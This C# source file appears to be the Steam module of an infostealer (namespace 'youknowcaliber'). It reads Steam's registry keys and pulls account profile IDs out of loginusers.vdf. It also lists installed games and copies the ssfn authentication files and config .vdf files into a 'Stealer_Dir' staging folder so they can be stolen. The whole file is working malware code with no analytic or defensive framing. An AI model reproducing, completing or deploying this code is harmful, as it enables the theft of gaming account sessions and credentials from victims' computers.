using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace youknowcaliber
{
    class Steam
    {
        public static void SteamGet()
        {
            try
            {
                string Stealer_Dir = Help.ExploitDir + "\\Steam";
                RegistryKey rkSteam = Registry.CurrentUser.OpenSubKey(SteamPath_x32);
                string sSteamPath = rkSteam.GetValue("SteamPath").ToString();
                if (!Directory.Exists(sSteamPath))
                    return;
                if (GetLocationSteam() == null)
                    return;
                if (GetAllProfiles() == null)
                    return;

                Directory.CreateDirectory(Stealer_Dir);
                foreach (var d in GetAllProfiles())
                {
                    File.AppendAllText(Stealer_Dir + "\\AccountsList.txt", d);
                }
                // Get steam applications list
                foreach (string GameID in rkSteam.OpenSubKey("Apps").GetSubKeyNames())
                {
                    using (RegistryKey app = rkSteam.OpenSubKey("Apps\\" + GameID))
                    {
                        string Name = (string)app.GetValue("Name");
                        Name = string.IsNullOrEmpty(Name) ? "Unknown" : Name;
                        File.AppendAllText(Stealer_Dir + "\\Games.txt", $"{Name}\n");
                    }
                }
                // Copy .ssfn files
                if (Directory.Exists(sSteamPath))
                {
                    Directory.CreateDirectory(Stealer_Dir + "\\ssnf");
                    foreach (string file in Directory.GetFiles(sSteamPath))
                        if (file.Contains("ssfn"))
                            File.Copy(file, Stealer_Dir + "\\ssnf\\" + Path.GetFileName(file));
                }
                // Copy .vdf files
                string ConfigPath = Path.Combine(sSteamPath, "config");
                if (Directory.Exists(ConfigPath))
                {
                    Directory.CreateDirectory(Stealer_Dir + "\\configs");
                    foreach (string file in Directory.GetFiles(ConfigPath))
                        if (file.EndsWith("vdf"))
                            File.Copy(file, Stealer_Dir + "\\configs\\" + Path.GetFileName(file));
                }
                Counting.Steam++;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);

                return;
            } 
        }
        private static readonly string SteamPath_x64 = @"SOFTWARE\Wow6432Node\Valve\Steam";
        public static readonly string SteamPath_x32 = @"Software\Valve\Steam";
        private static readonly bool True = true, False = false;

        public static string GetLocationSteam(string Inst = "InstallPath", string Source = "SourceModInstallPath")
        {
            try
            {
                using (var BaseSteam = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, (Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32)))
                {
                    using (RegistryKey Key = BaseSteam.OpenSubKey(SteamPath_x64, (Environment.Is64BitOperatingSystem ? True : False)))
                    {
                        using (RegistryKey Key2 = BaseSteam.OpenSubKey(SteamPath_x32, (Environment.Is64BitOperatingSystem ? True : False)))
                        {
                            return Key?.GetValue(Inst)?.ToString() ?? Key2?.GetValue(Source)?.ToString();
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return null;
            }
        }
        private static readonly string LoginFile = Path.Combine(GetLocationSteam(), @"config\loginusers.vdf");
        public static List<string> GetAllProfiles()
        {
            try
            {
                if (!File.Exists(LoginFile))
                  return null;
                var textlogin = File.ReadAllText(LoginFile);
                var result = Regex.Matches(textlogin, "\\\"76(.*?)\\\"").Cast<Match>().Select(x => "76" + x.Groups[1].Value).ToList();
                List<string> lists = new List<string>();
                for (int d = 0; d < result.Count(); d++)
                {
                    lists.Add("https://steamcommunity.com/profiles/" + result[d] + "\n");
                }
                return lists;

            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                return null;
            }
        }
    }
}
